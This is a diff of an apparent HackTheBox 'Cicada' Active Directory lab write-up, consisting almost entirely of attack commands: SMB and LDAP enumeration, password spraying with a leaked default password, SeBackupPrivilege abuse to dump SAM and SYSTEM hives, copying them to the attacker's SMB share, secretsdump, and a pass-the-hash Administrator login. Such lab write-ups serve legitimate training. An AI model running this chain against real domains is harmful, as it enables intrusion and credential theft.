@@ -1,11 +1,12 @@
 ---
 title: Cicada - Active Directory
 date: 2025-12-05 00:00:00 +0000
-categories: [HackTheBox Writeups]
+categories: [HackTheBox Writeups, Windows]
 tags: [hackthebox, windows]
 ---
 
-```bash
+
+```
 ares@legion:~/HackTheBox/Cicada$ nmap -sVC -A -T4 $target
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 13:01 EET
 Nmap scan report for 10.129.61.174 (10.129.61.174)
@@ -56,6 +57,7 @@ HOP RTT      ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 65.70 seconds
 ```
+
 
 ```
 enum4linux-ng $target | tee enum4linuxng.log
@@ -192,70 +194,78 @@ Server type string: null
 [-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED
 
 ```
-```bash
+
+```
 netexec smb $target -u 'guest' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=. EXCLUDE_FILTER='PRINT$','IPC$','SYSVOL','NETLOGON' EXCLUDE_EXTS='lnk','ini','ico'
 ```
-![20251110131220.png](/assets/img/htb-writeups/Pasted image 20251110131220.png)
-```bash
+![[Pasted image 20251110131220.png]]
+```
   ares@legion:~/HackTheBox/Cicada/10.129.61.174/HR$ strings Notice\ from\ HR.txt 
 Dear new hire!
 Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.
 Your default password is: Cicada$M6Corpb*@Lp#nZp!8
 ```
+  
 ```
   impacket-lookupsid anonymous@10.129.61.174 | tee usernames
-```bash
-  ![20251110133137.png](/assets/img/htb-writeups/Pasted image 20251110133137.png)
+```
+  ![[Pasted image 20251110133137.png]]
 ```
   crackmapexec smb $target -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
-```bash
-![20251110133551.png](/assets/img/htb-writeups/Pasted image 20251110133551.png)
+```
+![[Pasted image 20251110133551.png]]
 
 Enumarate AD metadata for passwords:
 ```
 netexec ldap $target -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -d cicada.htb --kdcHost $target --users
-```bash
-![20251110141128.png](/assets/img/htb-writeups/Pasted image 20251110141128.png)
+```
+![[Pasted image 20251110141128.png]]
 ```
 ldapsearch -H ldap://$target -x -D "michael.wrightson@cicada.htb" -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=cicada,DC=htb" "(objectClass=user)" description info
-```bash
+```
+
  David Orelious, Users, cicada.htb
 dn: CN=David Orelious,CN=Users,DC=cicada,DC=htb
 description: Just in case I forget my password is aRt$Lp#7t*VQ!3
 
-![20251110140553.png](/assets/img/htb-writeups/Pasted image 20251110140553.png)
+![[Pasted image 20251110140553.png]]
 
-```bash
+```
 smbclient //10.129.61.174/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3' -W cicada.htb -c 'prompt OFF; recurse ON; mget *'
 ```
-![20251110142124.png](/assets/img/htb-writeups/Pasted image 20251110142124.png)
+![[Pasted image 20251110142124.png]]
 
 $username = "emily.oscars"
 $password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
-![20251110143314.png](/assets/img/htb-writeups/Pasted image 20251110143314.png)
+![[Pasted image 20251110143314.png]]
 
-```bash
+```
 bundle exec evil-winrm.rb -i 10.129.61.174 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
-```bash
+```
+
 SeBackupPrivilege
-![20251110151546.png](/assets/img/htb-writeups/Pasted image 20251110151546.png)
+![[Pasted image 20251110151546.png]]
 ```
 reg save hklm\sam C:\Windows\Temp\sam
 reg save hklm\system C:\Windows\Temp\system
-```bash
+```
+
 Transfer files:
-```bash
+```
 sudo impacket-smbserver -smb2support myshare . 
 ```
+
 ```
 copy C:\Windows\Temp\sam \\10.10.14.183\myshare\
 copy C:\Windows\Temp\system \\10.10.14.183\myshare\
 ```
-```bash
+
+```
 impacket-secretsdump -sam sam -system system LOCAL 
 ```
-![20251110152127.png](/assets/img/htb-writeups/Pasted image 20251110152127.png)
+![[Pasted image 20251110152127.png]]
 
-```bash
+```
 bundle exec evil-winrm.rb -i 10.129.61.174 -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
 ```
+
